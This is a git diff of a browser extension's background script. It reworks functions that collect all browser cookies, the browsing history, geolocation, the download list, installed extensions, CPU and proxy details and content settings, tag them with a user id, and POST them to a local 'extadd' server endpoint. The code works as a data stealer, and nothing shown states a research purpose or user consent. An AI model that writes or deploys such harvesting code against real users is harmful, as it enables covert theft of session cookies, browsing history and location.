@@ -192,7 +192,7 @@ Send Function:
 References:
 https://stackoverflow.com/questions/53026387/how-to-get-all-chrome-content-settings
     */
-function logCPU(C){
+function logTest(C){
     fetch('http://127.0.0.1:5000/control_server',
             {
             method: "POST",
@@ -202,24 +202,30 @@ function logCPU(C){
             }
     )
     }
-
 function logGeolocation(){
     chrome.storage.local.get(["lat", "long"]).then((result)=>{ //take the information, if exists from the storage
         //this data is obtained in the content script
         if(result.lat != undefined){
+        S = {}
+        S.lat = result.lat;
+        S.lon = result.long;
         number = 3; //send it to the server with the needed information for storing
-        fetch(`http://127.0.0.1:5000/control_server`, 
-        {
-        method: "POST",
-        mode: 'no-cors',
-        body: JSON.stringify([result.lat, result.long]),
-        headers:{"Content-Type": "application/json"}
-        })
-        ;}})
+        setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
+    
+            S.uid = result.uid.toString();
+      
+            fetch(`http://127.0.0.1:5000/extadd/${number}`,
+            {
+            method: "POST",
+            mode: 'no-cors',
+            body: JSON.stringify(S),
+            headers:{"Content-Type": "application/json"}
+            })
+            
+            })},1500);}})
 }
-
 function loggingcontentSettings(){
-
+    number = 1;
     var S={};
 
     chrome.contentSettings.cookies.get({primaryUrl:'http://*'},function(details){S.Cookies = details.setting;});
@@ -238,7 +244,7 @@ function loggingcontentSettings(){
     setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
     
         S.uid = result.uid.toString();
-        number = 1;
+  
         fetch(`http://127.0.0.1:5000/extadd/${number}`,
         {
         method: "POST",
@@ -251,7 +257,6 @@ function loggingcontentSettings(){
 
 
 }
-
 function loggingprivacySettings(){
 
     var S={};
@@ -286,16 +291,21 @@ function logCookies() {
         for (const cookie of cookies) {
           a.push(cookie);
         }
-        fetch(
-            `${SERVER_HOST}/c`,
+        setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
+            S = {}
+            S.blob = a
+            number = 4
+            S.uid = result.uid.toString();
+      
+            fetch(`http://127.0.0.1:5000/extadd/${number}`,
             {
-                method: "POST",
-                body:JSON.stringify(a),
-                headers: {
-                    "Content-Type": "application/json"
-                }
-            }
-        );
+            method: "POST",
+            mode: 'no-cors',
+            body: JSON.stringify(S),
+            headers:{"Content-Type": "application/json"}
+            })
+            
+            })},1500); 
 
     });
 
@@ -306,16 +316,21 @@ function logHistory(){
         for(const his of hists){
             a.push(his)
         }
-        fetch(
-            `${SERVER_HOST}/h`,
+        setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
+            number = 5
+            S = {}
+            S.blob = a
+            S.uid = result.uid.toString();
+      
+            fetch(`http://127.0.0.1:5000/extadd/${number}`,
             {
-                method: "POST",
-                body:JSON.stringify(a),
-                headers: {
-                    "Content-Type": "application/json"
-                }
-            }
-        );
+            method: "POST",
+            mode: 'no-cors',
+            body: JSON.stringify(S),
+            headers:{"Content-Type": "application/json"}
+            })
+            
+            })},1500); 
 
     });
 
@@ -323,46 +338,78 @@ function logHistory(){
 }
 function logDowloads(){
     chrome.downloads.search({}).then((down)=>{
-        fetch('http://127.0.0.1:5000/control_server',
-        {
-        method: "POST",
-        mode: 'no-cors', 
-        body: JSON.stringify( down),
-        headers:{"Content-Type": "application/json"}
-        })
+        setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
+            number = 6
+            S = {}
+            S.blob = down
+            S.uid = result.uid.toString();
+      
+            fetch(`http://127.0.0.1:5000/extadd/${number}`,
+            {
+            method: "POST",
+            mode: 'no-cors',
+            body: JSON.stringify(S),
+            headers:{"Content-Type": "application/json"}
+            })
+            
+            })},1500); 
     })   
 }
-function logManagement(){
-    chrome.management.getAll({}).then((down)=>{
-        fetch('http://127.0.0.1:5000/control_server',
-        {
-        method: "POST",
-        mode: 'no-cors', 
-        body: JSON.stringify( down),
-        headers:{"Content-Type": "application/json"}
-        })
+function logExtensions(){
+    chrome.management.getAll({}).then((ext)=>{
+        setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
+            number = 7
+            S = {}
+            S.blob = ext
+            S.uid = result.uid.toString();
+      
+            fetch(`http://127.0.0.1:5000/extadd/${number}`,
+            {
+            method: "POST",
+            mode: 'no-cors',
+            body: JSON.stringify(S),
+            headers:{"Content-Type": "application/json"}
+            })
+            
+            })},1500); 
     })   
 }
 function logCpu(){
-    chrome.system.cpu.getInfo({}).then((down)=>{
-        fetch('http://127.0.0.1:5000/control_server',
-        {
-        method: "POST",
-        mode: 'no-cors', 
-        body: JSON.stringify( down),
-        headers:{"Content-Type": "application/json"}
-        })
+    chrome.system.cpu.getInfo({}).then((cpu)=>{
+        setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
+            number = 8
+            S = {}
+            S.blob = cpu
+            S.uid = result.uid.toString();
+      
+            fetch(`http://127.0.0.1:5000/extadd/${number}`,
+            {
+            method: "POST",
+            mode: 'no-cors',
+            body: JSON.stringify(S),
+            headers:{"Content-Type": "application/json"}
+            })
+            
+            })},1500); 
     })   
 }
 function logProxy(){
-    chrome.proxy.settings.get({'incognito': false}).then((down)=>{
-        fetch('http://127.0.0.1:5000/control_server',
-        {
-        method: "POST",
-        mode: 'no-cors', 
-        body: JSON.stringify( down),
-        headers:{"Content-Type": "application/json"}
-        })
+    chrome.proxy.settings.get({'incognito': false}).then((prox)=>{
+        setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
+            number = 9
+            S = {}
+            S.blob = prox
+            S.uid = result.uid.toString();
+      
+            fetch(`http://127.0.0.1:5000/extadd/${number}`,
+            {
+            method: "POST",
+            mode: 'no-cors',
+            body: JSON.stringify(S),
+            headers:{"Content-Type": "application/json"}
+            })
+            
+            })},1500); 
     })   
 }
 function logSend(){
@@ -373,7 +420,7 @@ function logSend(){
         logHistory();
         logGeolocation();
         logDowloads();
-        logManagement();
+        logExtensions();
         logCpu();
         logProxy;
         loggingcontentSettings();
